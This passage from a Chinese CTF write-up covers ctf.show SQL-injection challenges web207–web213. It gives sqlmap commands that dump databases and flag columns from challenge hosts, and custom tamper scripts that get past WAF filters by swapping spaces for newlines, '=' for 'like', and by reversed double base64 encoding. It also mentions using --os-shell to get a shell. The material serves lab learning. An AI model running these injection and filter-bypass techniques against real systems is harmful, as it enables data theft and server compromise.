<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python3 sqlmap.py -u https://bab8f673-3dab-4917-acc0-caa401b34c6e.challenge.ctf.show//api/index.php --method=PUT --data=<span class="hljs-string">&quot;id=1&quot;</span> --referer=ctf.show --headers=<span class="hljs-string">&quot;Content-Type:Text/plain&quot;</span> --safe-url=https://bab8f673-3dab-4917-acc0-caa401b34c6e.challenge.ctf.show/api/getToken.php --safe-freq=1 --dbs --tamper=web207<br></code></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python3 sqlmap.py -u https://bab8f673-3dab-4917-acc0-caa401b34c6e.challenge.ctf.show//api/index.php --method=PUT --data=<span class="hljs-string">&quot;id=1&quot;</span> --referer=ctf.show --headers=<span class="hljs-string">&quot;Content-Type:Text/plain&quot;</span> --safe-url=https://bab8f673-3dab-4917-acc0-caa401b34c6e.challenge.ctf.show/api/getToken.php --safe-freq=1 -D ctfshow_web -T ctfshow_flaxca -C flagvc -dump --tamper=web207<br></code></pre></td></tr></table></figure>

<p>流程都是一样的我只放第一步和最后一步的，都是按库表列进行爆，脚本我用的y4师傅的</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">Author:Y4tacker</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br><br><span class="hljs-keyword">from</span> lib.core.compat <span class="hljs-keyword">import</span> xrange<br><span class="hljs-keyword">from</span> lib.core.enums <span class="hljs-keyword">import</span> PRIORITY<br><br>__priority__ = PRIORITY.LOW<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">tamper</span>(<span class="hljs-params">payload, **kwargs</span>):<br>    payload = space2comment(payload)<br>    <span class="hljs-keyword">return</span> payload<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">space2comment</span>(<span class="hljs-params">payload</span>):<br>    retVal = payload<br>    <span class="hljs-keyword">if</span> payload:<br>        retVal = <span class="hljs-string">&quot;&quot;</span><br>        quote, doublequote, firstspace = <span class="hljs-literal">False</span>, <span class="hljs-literal">False</span>, <span class="hljs-literal">False</span><br><br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> xrange(<span class="hljs-built_in">len</span>(payload)):<br>            <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> firstspace:<br>                <span class="hljs-keyword">if</span> payload[i].isspace():<br>                    firstspace = <span class="hljs-literal">True</span><br>                    retVal += <span class="hljs-built_in">chr</span>(<span class="hljs-number">0x0a</span>)<br>                    <span class="hljs-keyword">continue</span><br><br>            <span class="hljs-keyword">elif</span> payload[i] == <span class="hljs-string">&#x27;\&#x27;&#x27;</span>:<br>                quote = <span class="hljs-keyword">not</span> quote<br><br>            <span class="hljs-keyword">elif</span> payload[i] == <span class="hljs-string">&#x27;&quot;&#x27;</span>:<br>                doublequote = <span class="hljs-keyword">not</span> doublequote<br><br>            <span class="hljs-keyword">elif</span> payload[i] == <span class="hljs-string">&quot; &quot;</span> <span class="hljs-keyword">and</span> <span class="hljs-keyword">not</span> doublequote <span class="hljs-keyword">and</span> <span class="hljs-keyword">not</span> quote:<br>                retVal += <span class="hljs-built_in">chr</span>(<span class="hljs-number">0x0a</span>)<br>                <span class="hljs-keyword">continue</span><br><br>            retVal += payload[i]<br><br>    <span class="hljs-keyword">return</span> retVal<br></code></pre></td></tr></table></figure>

<p>在这段代码中，chr(0x0a)用于替换 payload 中的空格，使得这些空格被转换为换行。可以观察原来的space2comment的脚本，原来的脚本是利用<code>/**/</code>进行绕过，这里利用换行进行绕过</p>
<h2 id="web208"><a href="#web208" class="headerlink" title="web208"></a>web208</h2><p>分析下这题，过滤了</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//对传入的参数进行了过滤</span><br><span class="hljs-comment">// $id = str_replace(&#x27;select&#x27;, &#x27;&#x27;, $id);</span><br>  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">waf</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>)</span>&#123;<br>   <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/ /&#x27;</span>, <span class="hljs-variable">$str</span>);<br>  &#125;<br></code></pre></td></tr></table></figure>

<p>过滤了空格和select,sqlmap默认是大写的，所以四舍五入没有，然后空格可以直接使用space2coment，然后流程都是一样的</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">python3</span> sqlmap.py -u https://<span class="hljs-number">14</span>fbd5b1-<span class="hljs-number">877</span>c-<span class="hljs-number">4751</span>-<span class="hljs-number">963</span>f-<span class="hljs-number">93767</span>f3631ff.challenge.ctf.show/api/index.php --method=PUT --data=<span class="hljs-string">&quot;id=1&quot;</span> --referer=ctf.show --headers=<span class="hljs-string">&quot;Content-Type:Text/plain&quot;</span> --safe-url=https://<span class="hljs-number">14</span>fbd5b1-<span class="hljs-number">877</span>c-<span class="hljs-number">4751</span>-<span class="hljs-number">963</span>f-<span class="hljs-number">93767</span>f3631ff.challenge.ctf.show/api/getToken.php --safe-freq=<span class="hljs-number">1</span> --dbs --tamper=space2comment<br></code></pre></td></tr></table></figure>

<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">python3</span> sqlmap.py -u https://<span class="hljs-number">14</span>fbd5b1-<span class="hljs-number">877</span>c-<span class="hljs-number">4751</span>-<span class="hljs-number">963</span>f-<span class="hljs-number">93767</span>f3631ff.challenge.ctf.show/api/index.php --method=PUT --data=<span class="hljs-string">&quot;id=1&quot;</span> --referer=ctf.show --headers=<span class="hljs-string">&quot;Content-Type:Text/plain&quot;</span> --safe-url=https://<span class="hljs-number">14</span>fbd5b1-<span class="hljs-number">877</span>c-<span class="hljs-number">4751</span>-<span class="hljs-number">963</span>f-<span class="hljs-number">93767</span>f3631ff.challenge.ctf.show/api/getToken.php --safe-freq=<span class="hljs-number">1</span> -D ctfshow_web -T ctfshow_flaxcac -C flagvca -dump --tamper=space2comment<br></code></pre></td></tr></table></figure>

<h2 id="web209"><a href="#web209" class="headerlink" title="web209"></a>web209</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/ |\*|\=/&#x27;</span>, <span class="hljs-variable">$str</span>);<br></code></pre></td></tr></table></figure>

<p>过滤了等于可以用like进行绕过，过滤了*,继续用自写脚本吧</p>
<figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs maxima">python3 sqlmap.py -u https://e1913103-c779-4ae7-<span class="hljs-number">95b9</span>-a05a83ce161d.challenge.ctf.<span class="hljs-built_in">show</span>/api/index.php --<span class="hljs-built_in">method</span>=PUT --data=<span class="hljs-string">&quot;id=1&quot;</span> --referer=ctf.<span class="hljs-built_in">show</span> --headers=<span class="hljs-string">&quot;Content-Type:Text/plain&quot;</span> --safe-url=https://e1913103-c779-4ae7-<span class="hljs-number">95b9</span>-a05a83ce161d.challenge.ctf.<span class="hljs-built_in">show</span>/api/getToken.php --safe-freq=<span class="hljs-number">1</span> --dbs --tamper=web209<br></code></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python3 sqlmap.py -u https://e1913103-c779-4ae7-95b9-a05a83ce161d.challenge.ctf.show/api/index.php --method=PUT --data=<span class="hljs-string">&quot;id=1&quot;</span> --referer=ctf.show --headers=<span class="hljs-string">&quot;Content-Type:Text/plain&quot;</span> --safe-url=https://e1913103-c779-4ae7-95b9-a05a83ce161d.challenge.ctf.show/api/getToken.php --safe-freq=1 -D ctfshow_web -T ctfshow_flav -C ctfshow_flagx -dump --tamper=web209<br></code></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">Author:Y4tacker</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br><span class="hljs-keyword">from</span> lib.core.compat <span class="hljs-keyword">import</span> xrange<br><span class="hljs-keyword">from</span> lib.core.enums <span class="hljs-keyword">import</span> PRIORITY<br><br>__priority__ = PRIORITY.LOW<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">tamper</span>(<span class="hljs-params">payload, **kwargs</span>):<br>    payload = space2comment(payload)<br>    <span class="hljs-keyword">return</span> payload<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">space2comment</span>(<span class="hljs-params">payload</span>):<br>    retVal = payload<br>    <span class="hljs-keyword">if</span> payload:<br>        retVal = <span class="hljs-string">&quot;&quot;</span><br>        quote, doublequote, firstspace = <span class="hljs-literal">False</span>, <span class="hljs-literal">False</span>, <span class="hljs-literal">False</span><br><br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> xrange(<span class="hljs-built_in">len</span>(payload)):<br>            <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> firstspace:<br>                <span class="hljs-keyword">if</span> payload[i].isspace():<br>                    firstspace = <span class="hljs-literal">True</span><br>                    retVal += <span class="hljs-built_in">chr</span>(<span class="hljs-number">0x0a</span>)<br>                    <span class="hljs-keyword">continue</span><br><br>            <span class="hljs-keyword">elif</span> payload[i] == <span class="hljs-string">&#x27;\&#x27;&#x27;</span>:<br>                quote = <span class="hljs-keyword">not</span> quote<br><br>            <span class="hljs-keyword">elif</span> payload[i] == <span class="hljs-string">&#x27;&quot;&#x27;</span>:<br>                doublequote = <span class="hljs-keyword">not</span> doublequote<br><br>            <span class="hljs-keyword">elif</span> payload[i] == <span class="hljs-string">&quot;*&quot;</span>:<br>                retVal += <span class="hljs-built_in">chr</span>(<span class="hljs-number">0x31</span>)<br>                <span class="hljs-keyword">continue</span><br><br>            <span class="hljs-keyword">elif</span> payload[i] == <span class="hljs-string">&quot;=&quot;</span>:<br>                retVal += <span class="hljs-built_in">chr</span>(<span class="hljs-number">0x0a</span>)+<span class="hljs-string">&#x27;like&#x27;</span>+<span class="hljs-built_in">chr</span>(<span class="hljs-number">0x0a</span>)<br>                <span class="hljs-keyword">continue</span><br><br>            <span class="hljs-keyword">elif</span> payload[i] == <span class="hljs-string">&quot; &quot;</span> <span class="hljs-keyword">and</span> <span class="hljs-keyword">not</span> doublequote <span class="hljs-keyword">and</span> <span class="hljs-keyword">not</span> quote:<br>                retVal += <span class="hljs-built_in">chr</span>(<span class="hljs-number">0x0a</span>)<br>                <span class="hljs-keyword">continue</span><br><br>            retVal += payload[i]<br><br>    <span class="hljs-keyword">return</span> retVal<br><br></code></pre></td></tr></table></figure>

<p><code>*</code>，将其替换为字符 <code>1</code> (<code>chr(0x31)</code>) 并继续处理下一个字符</p>
<p><code>=</code>，在返回值中插入换行符 (<code>\n</code>)，后跟 <code>&#39;like&#39;</code>，再插入一个换行符</p>
<h2 id="web210"><a href="#web210" class="headerlink" title="web210"></a>web210</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">strrev</span>(<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-title function_ invoke__">strrev</span>(<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$id</span>))));<br></code></pre></td></tr></table></figure>

<p>这段代码实现了对字符串 <code>$id</code> 的双重 Base64 解码和反转</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python3 sqlmap.py -u https://910c1d79-011c-49c3-95c4-bb1773a9e384.challenge.ctf.show/api/index.php --method=PUT --data=<span class="hljs-string">&quot;id=1&quot;</span> --referer=ctf.show --headers=<span class="hljs-string">&quot;Content-Type:Text/plain&quot;</span> --safe-url=https://910c1d79-011c-49c3-95c4-bb1773a9e384.challenge.ctf.show/api/getToken.php --safe-freq=1 --dbs --tamper=web210<br></code></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python3 sqlmap.py -u https://910c1d79-011c-49c3-95c4-bb1773a9e384.challenge.ctf.show/api/index.php --method=PUT --data=<span class="hljs-string">&quot;id=1&quot;</span> --referer=ctf.show --headers=<span class="hljs-string">&quot;Content-Type:Text/plain&quot;</span> --safe-url=https://910c1d79-011c-49c3-95c4-bb1773a9e384.challenge.ctf.show/api/getToken.php --safe-freq=1 -D ctfshow_web -T ctfshow_flavi -C ctfshow_flagxx -dump --tamper=web210<br></code></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> lib.core.compat <span class="hljs-keyword">import</span> xrange<br><span class="hljs-keyword">from</span> lib.core.enums <span class="hljs-keyword">import</span> PRIORITY<br><span class="hljs-keyword">import</span> base64<br>__priority__ = PRIORITY.LOW<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">tamper</span>(<span class="hljs-params">payload, **kwargs</span>):<br>    payload = payload[::-<span class="hljs-number">1</span>].encode()<br>    payload = base64.b64encode(payload)<br>    payload = (payload.decode())[::-<span class="hljs-number">1</span>]<br>    payload = base64.b64encode(payload.encode())<br>    <span class="hljs-keyword">return</span> payload.decode()<br></code></pre></td></tr></table></figure>

<h2 id="web211"><a href="#web211" class="headerlink" title="web211"></a>web211</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">waf</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>)</span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/ /&#x27;</span>, <span class="hljs-variable">$str</span>);<br>&#125;<br></code></pre></td></tr></table></figure>

<p>在上一题的基础上加了一个空格绕过，稍微微调一下脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> lib.core.compat <span class="hljs-keyword">import</span> xrange<br><span class="hljs-keyword">from</span> lib.core.enums <span class="hljs-keyword">import</span> PRIORITY<br><span class="hljs-keyword">import</span> base64<br>__priority__ = PRIORITY.LOW<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">tamper</span>(<span class="hljs-params">payload, **kwargs</span>):<br>    payload = space2comment(payload)<br>    retVal = <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-keyword">if</span> payload:<br>        retVal = base64.b64encode(payload[::-<span class="hljs-number">1</span>].encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>))<br>        retVal = base64.b64encode(retVal[::-<span class="hljs-number">1</span>]).decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>    <span class="hljs-keyword">return</span> retVal<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">space2comment</span>(<span class="hljs-params">payload</span>):<br>    retVal = payload<br>    <span class="hljs-keyword">if</span> payload:<br>        retVal = <span class="hljs-string">&quot;&quot;</span><br>        quote, doublequote, firstspace = <span class="hljs-literal">False</span>, <span class="hljs-literal">False</span>, <span class="hljs-literal">False</span><br><br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> xrange(<span class="hljs-built_in">len</span>(payload)):<br>            <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> firstspace:<br>                <span class="hljs-keyword">if</span> payload[i].isspace():<br>                    firstspace = <span class="hljs-literal">True</span><br>                    retVal += <span class="hljs-built_in">chr</span>(<span class="hljs-number">0x0a</span>)<br>                    <span class="hljs-keyword">continue</span><br><br>            <span class="hljs-keyword">elif</span> payload[i] == <span class="hljs-string">&#x27;\&#x27;&#x27;</span>:<br>                quote = <span class="hljs-keyword">not</span> quote<br><br>            <span class="hljs-keyword">elif</span> payload[i] == <span class="hljs-string">&#x27;&quot;&#x27;</span>:<br>                doublequote = <span class="hljs-keyword">not</span> doublequote<br><br>           <br>            <span class="hljs-keyword">elif</span> payload[i] == <span class="hljs-string">&quot; &quot;</span> <span class="hljs-keyword">and</span> <span class="hljs-keyword">not</span> doublequote <span class="hljs-keyword">and</span> <span class="hljs-keyword">not</span> quote:<br>                retVal += <span class="hljs-built_in">chr</span>(<span class="hljs-number">0x0a</span>)<br>                <span class="hljs-keyword">continue</span><br><br>            retVal += payload[i]<br><br>    <span class="hljs-keyword">return</span> retVal<br><br></code></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python3 sqlmap.py -u https://73a357ff-155b-456a-8eeb-360b369c9564.challenge.ctf.show/api/index.php --method=PUT --data=<span class="hljs-string">&quot;id=1&quot;</span> --referer=ctf.show --headers=<span class="hljs-string">&quot;Content-Type:Text/plain&quot;</span> --safe-url=https://73a357ff-155b-456a-8eeb-360b369c9564.challenge.ctf.show/api/getToken.php --safe-freq=1 --dbs --tamper=web211<br></code></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python3 sqlmap.py -u https://73a357ff-155b-456a-8eeb-360b369c9564.challenge.ctf.show/api/index.php --method=PUT --data=<span class="hljs-string">&quot;id=1&quot;</span> --referer=ctf.show --headers=<span class="hljs-string">&quot;Content-Type:Text/plain&quot;</span> --safe-url=https://73a357ff-155b-456a-8eeb-360b369c9564.challenge.ctf.show/api/getToken.php --safe-freq=1 -D ctfshow_web -T ctfshow_flavia -C ctfshow_flagxxa -dump --tamper=web211<br></code></pre></td></tr></table></figure>

<h2 id="web212"><a href="#web212" class="headerlink" title="web212"></a>web212</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php">  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">decode</span>(<span class="hljs-params"><span class="hljs-variable">$id</span></span>)</span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">strrev</span>(<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-title function_ invoke__">strrev</span>(<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$id</span>))));<br>  &#125;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">waf</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>)</span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/ |\*/&#x27;</span>, <span class="hljs-variable">$str</span>);<br>&#125;<br></code></pre></td></tr></table></figure>

<p>加了这些限制，继续修改脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">Author:Y4tacker</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br><span class="hljs-keyword">from</span> lib.core.compat <span class="hljs-keyword">import</span> xrange<br><span class="hljs-keyword">from</span> lib.core.enums <span class="hljs-keyword">import</span> PRIORITY<br><span class="hljs-keyword">import</span> base64<br>__priority__ = PRIORITY.LOW<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">tamper</span>(<span class="hljs-params">payload, **kwargs</span>):<br>    payload = space2comment(payload)<br>    retVal = <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-keyword">if</span> payload:<br>        retVal = base64.b64encode(payload[::-<span class="hljs-number">1</span>].encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>))<br>        retVal = base64.b64encode(retVal[::-<span class="hljs-number">1</span>]).decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>    <span class="hljs-keyword">return</span> retVal<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">space2comment</span>(<span class="hljs-params">payload</span>):<br>    retVal = payload<br>    <span class="hljs-keyword">if</span> payload:<br>        retVal = <span class="hljs-string">&quot;&quot;</span><br>        quote, doublequote, firstspace = <span class="hljs-literal">False</span>, <span class="hljs-literal">False</span>, <span class="hljs-literal">False</span><br><br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> xrange(<span class="hljs-built_in">len</span>(payload)):<br>            <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> firstspace:<br>                <span class="hljs-keyword">if</span> payload[i].isspace():<br>                    firstspace = <span class="hljs-literal">True</span><br>                    retVal += <span class="hljs-built_in">chr</span>(<span class="hljs-number">0x0a</span>)<br>                    <span class="hljs-keyword">continue</span><br><br>            <span class="hljs-keyword">elif</span> payload[i] == <span class="hljs-string">&#x27;\&#x27;&#x27;</span>:<br>                quote = <span class="hljs-keyword">not</span> quote<br><br>            <span class="hljs-keyword">elif</span> payload[i] == <span class="hljs-string">&#x27;&quot;&#x27;</span>:<br>                doublequote = <span class="hljs-keyword">not</span> doublequote<br><br>            <span class="hljs-keyword">elif</span> payload[i] == <span class="hljs-string">&quot;*&quot;</span>:<br>                retVal += <span class="hljs-built_in">chr</span>(<span class="hljs-number">0x31</span>)<br>                <span class="hljs-keyword">continue</span><br><br>            <span class="hljs-keyword">elif</span> payload[i] == <span class="hljs-string">&quot; &quot;</span> <span class="hljs-keyword">and</span> <span class="hljs-keyword">not</span> doublequote <span class="hljs-keyword">and</span> <span class="hljs-keyword">not</span> quote:<br>                retVal += <span class="hljs-built_in">chr</span>(<span class="hljs-number">0x0a</span>)<br>                <span class="hljs-keyword">continue</span><br><br>            retVal += payload[i]<br><br>    <span class="hljs-keyword">return</span> retVal<br></code></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python3 sqlmap.py -u https://e8f8c96a-2345-4f22-82f6-dbddc934c835.challenge.ctf.show/api/index.php --method=PUT --data=<span class="hljs-string">&quot;id=1&quot;</span> --referer=ctf.show --headers=<span class="hljs-string">&quot;Content-Type:Text/plain&quot;</span> --safe-url=https://e8f8c96a-2345-4f22-82f6-dbddc934c835.challenge.ctf.show/api/getToken.php --safe-freq=1 --dbs --tamper=web212<br></code></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python3 sqlmap.py -u https://e8f8c96a-2345-4f22-82f6-dbddc934c835.challenge.ctf.show/api/index.php --method=PUT --data=<span class="hljs-string">&quot;id=1&quot;</span> --referer=ctf.show --headers=<span class="hljs-string">&quot;Content-Type:Text/plain&quot;</span> --safe-url=https://e8f8c96a-2345-4f22-82f6-dbddc934c835.challenge.ctf.show/api/getToken.php --safe-freq=1 -D ctfshow_web -T ctfshow_flavis -C ctfshow_flagxsa -dump --tamper=web212<br></code></pre></td></tr></table></figure>

<h2 id="web213"><a href="#web213" class="headerlink" title="web213"></a>web213</h2><p>练习使用–os-shell 一键getshell</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python3 sqlmap.py -u https://baf33310-7e1b-4002-bc30-c40e22df446d.challenge.ctf.show/api/index.php --method=PUT --data=<span class="hljs-string">&quot;id=1&quot;</span> --referer=ctf.show --headers=<span class="hljs-string">&quot;Content-Type:Text/plain&quot;</span> --safe-url=https://baf33310-7e1b-4002-bc30-c40e22df446d.challenge.ctf.show/api/getToken.php --safe-freq=1 --dbs --tamper=web212<br></code></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python3 sqlmap.py -u https://baf33310-7e1b-4002-bc30-c40e22df446d.challenge.ctf.show/api/index.php --method=PUT --data=<span class="hljs-string">&quot;id=1&quot;</span> --referer=ctf.show --headers=<span class="hljs-string">&quot;Content-Type:Text/plain&quot;</span> --safe-url=https://baf33310-7e1b-4002-bc30-c40e22df446d.challenge.ctf.show/api/getToken.php --safe-freq=1 -D ctfshow_web -T ctfshow_user -C username -dump --tamper=web212<br></code></pre></td></tr></table></figure>

<p>用上一题的可以直接打通但是找不到就提的flag在哪，所以需要getshell才行</p>
